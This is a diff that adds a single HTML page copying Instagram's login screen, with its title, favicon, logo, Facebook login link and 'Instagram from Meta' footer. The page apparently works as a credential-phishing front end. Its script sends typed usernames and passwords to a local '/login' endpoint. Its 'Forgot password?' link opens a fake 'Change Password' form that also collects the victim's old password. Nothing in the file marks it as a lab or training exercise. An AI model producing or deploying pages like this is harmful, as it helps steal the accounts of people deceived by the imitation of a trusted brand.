@@ -1,0 +1,545 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Instagram</title>
+  <link rel="icon" type="image/png" href="https://www.instagram.com/favicon.ico" />
+  <style>
+    /* ─── Reset & Base ─────────────────────────────────────────────── */
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      background-color: #fafafa;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto,
+                   Helvetica, Arial, sans-serif;
+      font-size: 14px;
+      color: #262626;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+    }
+
+    /* ─── Card ──────────────────────────────────────────────────────── */
+    .card {
+      width: 350px;
+      background: #fff;
+      border: 1px solid #dbdbdb;
+      border-radius: 1px;
+      padding: 40px 40px 24px;
+      margin-bottom: 10px;
+    }
+
+    /* ─── Instagram Logo ─────────────────────────────────────────────── */
+    .logo {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 28px;
+    }
+    .logo svg {
+      height: 51px;
+      width: auto;
+    }
+
+    /* ─── Floating-label input group ────────────────────────────────── */
+    .field-wrap {
+      position: relative;
+      margin-bottom: 6px;
+      border: 1px solid #dbdbdb;
+      border-radius: 3px;
+      background: #fafafa;
+    }
+    .field-wrap input {
+      width: 100%;
+      border: none;
+      background: transparent;
+      outline: none;
+      padding: 14px 8px 2px 8px;
+      font-size: 12px;
+      color: #262626;
+      height: 38px;
+    }
+    .field-wrap label {
+      position: absolute;
+      left: 8px;
+      top: 50%;
+      transform: translateY(-50%);
+      font-size: 12px;
+      color: #8e8e8e;
+      pointer-events: none;
+      transition: top 0.1s ease, font-size 0.1s ease, transform 0.1s ease;
+    }
+    .field-wrap input:focus + label,
+    .field-wrap input:not(:placeholder-shown) + label {
+      top: 8px;
+      transform: translateY(0);
+      font-size: 10px;
+    }
+    .field-wrap:focus-within {
+      border-color: #a8a8a8;
+    }
+
+    /* ─── Buttons ────────────────────────────────────────────────────── */
+    .btn-primary {
+      display: block;
+      width: 100%;
+      margin-top: 8px;
+      padding: 7px;
+      background: #0095f6;
+      color: #fff;
+      border: none;
+      border-radius: 8px;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: opacity 0.15s;
+      letter-spacing: 0.3px;
+    }
+    .btn-primary:hover   { opacity: 0.9; }
+    .btn-primary:active  { opacity: 0.75; }
+    .btn-primary:disabled { opacity: 0.5; cursor: default; }
+
+    /* ─── OR divider ─────────────────────────────────────────────────── */
+    .divider {
+      display: flex;
+      align-items: center;
+      gap: 18px;
+      margin: 18px 0 12px;
+    }
+    .divider hr {
+      flex: 1;
+      border: none;
+      border-top: 1px solid #dbdbdb;
+    }
+    .divider span {
+      font-size: 13px;
+      font-weight: 600;
+      color: #8e8e8e;
+      letter-spacing: 1px;
+    }
+
+    /* ─── Facebook login ─────────────────────────────────────────────── */
+    .fb-login {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      text-decoration: none;
+      color: #385185;
+      font-size: 14px;
+      font-weight: 600;
+      margin: 4px 0 14px;
+    }
+    .fb-login svg { width: 20px; height: 20px; }
+    .fb-login:hover { color: #1877f2; }
+
+    /* ─── Forgot password ────────────────────────────────────────────── */
+    .forgot {
+      text-align: center;
+      margin-top: 12px;
+    }
+    .forgot a {
+      font-size: 12px;
+      color: #00376b;
+      text-decoration: none;
+      font-weight: 600;
+    }
+    .forgot a:hover { text-decoration: underline; }
+
+    /* ─── Sign-up card ───────────────────────────────────────────────── */
+    .signup-card {
+      width: 350px;
+      background: #fff;
+      border: 1px solid #dbdbdb;
+      border-radius: 1px;
+      padding: 20px;
+      text-align: center;
+      font-size: 14px;
+      color: #262626;
+    }
+    .signup-card a {
+      color: #0095f6;
+      font-weight: 600;
+      text-decoration: none;
+    }
+
+    /* ─── App store badges ───────────────────────────────────────────── */
+    .app-badges {
+      margin-top: 20px;
+      text-align: center;
+    }
+    .app-badges p { font-size: 14px; margin-bottom: 14px; }
+    .app-badges .badges { display: flex; gap: 8px; justify-content: center; }
+    .app-badges .badge {
+      border: 1px solid #262626;
+      border-radius: 6px;
+      padding: 6px 12px;
+      font-size: 12px;
+      display: flex;
+      flex-direction: column;
+      line-height: 1.4;
+      cursor: pointer;
+    }
+    .app-badges .badge small { font-size: 10px; color: #555; }
+    .app-badges .badge b { font-size: 13px; }
+
+    /* ─── Alert box ──────────────────────────────────────────────────── */
+    .alert {
+      font-size: 13px;
+      padding: 10px 12px;
+      border-radius: 4px;
+      margin-bottom: 10px;
+      display: none;
+    }
+    .alert.error   { background: #ffe0e0; color: #d32f2f; border: 1px solid #f5c6c6; }
+    .alert.success { background: #e6f4ea; color: #2e7d32; border: 1px solid #a8d5b0; }
+    .alert.show    { display: block; }
+
+    /* ─── Password-change settings style ────────────────────────────── */
+    .settings-header {
+      font-size: 16px;
+      font-weight: 600;
+      color: #262626;
+      margin-bottom: 6px;
+      display: block;
+    }
+    .settings-sub {
+      font-size: 13px;
+      color: #8e8e8e;
+      margin-bottom: 24px;
+      display: block;
+    }
+
+    /* ─── Back link ──────────────────────────────────────────────────── */
+    .back-link {
+      text-align: center;
+      margin-top: 14px;
+    }
+    .back-link a {
+      font-size: 12px;
+      color: #0095f6;
+      text-decoration: none;
+      font-weight: 600;
+    }
+    .back-link a:hover { text-decoration: underline; }
+
+    /* ─── Password visibility toggle ────────────────────────────────── */
+    .field-wrap .toggle-pw {
+      position: absolute;
+      right: 10px;
+      top: 50%;
+      transform: translateY(-50%);
+      font-size: 12px;
+      font-weight: 600;
+      color: #262626;
+      cursor: pointer;
+      user-select: none;
+    }
+    .field-wrap input.has-toggle { padding-right: 48px; }
+
+    /* ─── View transitions ───────────────────────────────────────────── */
+    .view { display: none; }
+    .view.active { display: block; }
+
+    /* ─── Footer ─────────────────────────────────────────────────────── */
+    footer {
+      margin-top: 32px;
+      text-align: center;
+      font-size: 12px;
+      color: #8e8e8e;
+      line-height: 2;
+    }
+    footer .links {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 6px 14px;
+      margin-bottom: 12px;
+    }
+    footer .links a {
+      color: #8e8e8e;
+      text-decoration: none;
+      font-size: 12px;
+    }
+    footer .links a:hover { text-decoration: underline; }
+  </style>
+</head>
+<body>
+
+  <!-- ════════════════════ LOGIN VIEW ════════════════════ -->
+  <div id="view-login" class="view active">
+    <div class="card">
+      <!-- Instagram SVG wordmark -->
+      <div class="logo">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 175 50">
+          <text x="0" y="42"
+            font-family="'Billabong', 'Dancing Script', cursive, sans-serif"
+            font-size="46" fill="#262626" letter-spacing="-1">Instagram</text>
+        </svg>
+      </div>
+
+      <div id="login-alert" class="alert"></div>
+
+      <form id="login-form" novalidate>
+        <div class="field-wrap">
+          <input type="text" id="username" name="username"
+                 placeholder=" " autocomplete="username" required />
+          <label for="username">Phone number, username, or email</label>
+        </div>
+
+        <div class="field-wrap">
+          <input type="password" id="password" name="password"
+                 placeholder=" " autocomplete="current-password"
+                 class="has-toggle" required />
+          <label for="password">Password</label>
+          <span class="toggle-pw" data-target="password">Show</span>
+        </div>
+
+        <button class="btn-primary" type="submit" id="login-btn">Log in</button>
+      </form>
+
+      <div class="divider">
+        <hr /><span>OR</span><hr />
+      </div>
+
+      <a class="fb-login" href="#">
+        <!-- Facebook F icon -->
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="#385185">
+          <path d="M22 12c0-5.522-4.478-10-10-10S2 6.478 2 12c0 4.99 3.657
+                   9.128 8.438 9.878v-6.987h-2.54V12h2.54V9.797c0-2.506
+                   1.492-3.89 3.777-3.89 1.094 0 2.238.195 2.238.195v2.46h-1.26
+                   c-1.243 0-1.63.771-1.63 1.562V12h2.773l-.443 2.89h-2.33v6.988
+                   C18.343 21.128 22 16.991 22 12z"/>
+        </svg>
+        Log in with Facebook
+      </a>
+
+      <div class="forgot">
+        <a href="#" id="forgot-link">Forgot password?</a>
+      </div>
+    </div>
+
+    <div class="signup-card">
+      Don't have an account? <a href="#">Sign up</a>
+    </div>
+
+    <div class="app-badges">
+      <p>Get the app.</p>
+      <div class="badges">
+        <div class="badge">
+          <small>Download on the</small>
+          <b>App Store</b>
+        </div>
+        <div class="badge">
+          <small>Get it on</small>
+          <b>Google Play</b>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ════════════════ PASSWORD CHANGE VIEW ════════════════ -->
+  <div id="view-password" class="view">
+    <div class="card">
+      <div class="logo">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 175 50">
+          <text x="0" y="42"
+            font-family="'Billabong', 'Dancing Script', cursive, sans-serif"
+            font-size="46" fill="#262626" letter-spacing="-1">Instagram</text>
+        </svg>
+      </div>
+
+      <span class="settings-header">Change Password</span>
+      <span class="settings-sub">
+        Enter your old password and choose a new one to keep your account secure.
+      </span>
+
+      <div id="pw-alert" class="alert"></div>
+
+      <form id="pw-form" novalidate>
+        <div class="field-wrap">
+          <input type="password" id="old-password" name="old_password"
+                 placeholder=" " autocomplete="current-password"
+                 class="has-toggle" required />
+          <label for="old-password">Old Password</label>
+          <span class="toggle-pw" data-target="old-password">Show</span>
+        </div>
+
+        <div class="field-wrap">
+          <input type="password" id="new-password" name="new_password"
+                 placeholder=" " autocomplete="new-password"
+                 class="has-toggle" required />
+          <label for="new-password">New Password</label>
+          <span class="toggle-pw" data-target="new-password">Show</span>
+        </div>
+
+        <div class="field-wrap">
+          <input type="password" id="confirm-password" name="confirm_new_password"
+                 placeholder=" " autocomplete="new-password"
+                 class="has-toggle" required />
+          <label for="confirm-password">Confirm New Password</label>
+          <span class="toggle-pw" data-target="confirm-password">Show</span>
+        </div>
+
+        <button class="btn-primary" type="submit" id="pw-btn">Change Password</button>
+      </form>
+
+      <div class="back-link">
+        <a href="#" id="back-login-link">← Back to Login</a>
+      </div>
+    </div>
+  </div>
+
+  <!-- ═══════════════════════ FOOTER ═══════════════════════ -->
+  <footer>
+    <div class="links">
+      <a href="#">Meta</a><a href="#">About</a><a href="#">Blog</a>
+      <a href="#">Jobs</a><a href="#">Help</a><a href="#">API</a>
+      <a href="#">Privacy</a><a href="#">Terms</a><a href="#">Locations</a>
+      <a href="#">Instagram Lite</a><a href="#">Threads</a>
+      <a href="#">Contact Uploading &amp; Non-Users</a>
+      <a href="#">Meta Verified</a>
+    </div>
+    <span>© 2024 Instagram from Meta</span>
+  </footer>
+
+  <!-- ═══════════════════════ SCRIPT ═══════════════════════ -->
+  <script>
+    /* ── View switcher ──────────────────────────────────────── */
+    const views = {
+      login:    document.getElementById('view-login'),
+      password: document.getElementById('view-password'),
+    };
+    function showView(name) {
+      Object.values(views).forEach(v => v.classList.remove('active'));
+      views[name].classList.add('active');
+      clearAlerts();
+    }
+
+    document.getElementById('forgot-link').addEventListener('click', e => {
+      e.preventDefault();
+      showView('password');
+    });
+    document.getElementById('back-login-link').addEventListener('click', e => {
+      e.preventDefault();
+      showView('login');
+    });
+
+    /* ── Alert helpers ──────────────────────────────────────── */
+    function showAlert(id, message, type) {
+      const el = document.getElementById(id);
+      el.textContent = message;
+      el.className = `alert ${type} show`;
+    }
+    function clearAlerts() {
+      document.querySelectorAll('.alert').forEach(el => {
+        el.className = 'alert';
+        el.textContent = '';
+      });
+    }
+
+    /* ── Password visibility toggles ───────────────────────── */
+    document.querySelectorAll('.toggle-pw').forEach(btn => {
+      btn.addEventListener('click', () => {
+        const input = document.getElementById(btn.dataset.target);
+        if (input.type === 'password') {
+          input.type = 'text';
+          btn.textContent = 'Hide';
+        } else {
+          input.type = 'password';
+          btn.textContent = 'Show';
+        }
+      });
+    });
+
+    /* ── Login form ─────────────────────────────────────────── */
+    document.getElementById('login-form').addEventListener('submit', async e => {
+      e.preventDefault();
+      clearAlerts();
+
+      const username = document.getElementById('username').value.trim();
+      const password = document.getElementById('password').value;
+      const btn      = document.getElementById('login-btn');
+
+      if (!username || !password) {
+        showAlert('login-alert', 'Please enter your username and password.', 'error');
+        return;
+      }
+
+      btn.disabled = true;
+      btn.textContent = 'Logging in…';
+
+      try {
+        const res  = await fetch('/login', {
+          method:  'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body:    JSON.stringify({ username, password }),
+        });
+        const data = await res.json();
+
+        if (res.ok) {
+          showAlert('login-alert', data.message || 'Logged in successfully!', 'success');
+        } else {
+          showAlert('login-alert', data.error || 'Login failed. Please try again.', 'error');
+        }
+      } catch {
+        showAlert('login-alert', 'Could not connect to the server. Is it running?', 'error');
+      } finally {
+        btn.disabled = false;
+        btn.textContent = 'Log in';
+      }
+    });
+
+    /* ── Password-change form ───────────────────────────────── */
+    document.getElementById('pw-form').addEventListener('submit', async e => {
+      e.preventDefault();
+      clearAlerts();
+
+      const old_password         = document.getElementById('old-password').value;
+      const new_password         = document.getElementById('new-password').value;
+      const confirm_new_password = document.getElementById('confirm-password').value;
+      const btn                  = document.getElementById('pw-btn');
+
+      // Client-side validation
+      if (!old_password || !new_password || !confirm_new_password) {
+        showAlert('pw-alert', 'All fields are required.', 'error');
+        return;
+      }
+      if (new_password !== confirm_new_password) {
+        showAlert('pw-alert', 'New passwords do not match.', 'error');
+        return;
+      }
+      if (new_password.length < 6) {
+        showAlert('pw-alert', 'New password must be at least 6 characters.', 'error');
+        return;
+      }
+
+      btn.disabled    = true;
+      btn.textContent = 'Updating…';
+
+      try {
+        const res  = await fetch('/change-password', {
+          method:  'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body:    JSON.stringify({ old_password, new_password, confirm_new_password }),
+        });
+        const data = await res.json();
+
+        if (res.ok) {
+          showAlert('pw-alert', data.message || 'Password updated!', 'success');
+          document.getElementById('pw-form').reset();
+        } else {
+          showAlert('pw-alert', data.error || 'Update failed.', 'error');
+        }
+      } catch {
+        showAlert('pw-alert', 'Could not connect to the server. Is it running?', 'error');
+      } finally {
+        btn.disabled    = false;
+        btn.textContent = 'Change Password';
+      }
+    });
+  </script>
+</body>
+</html>
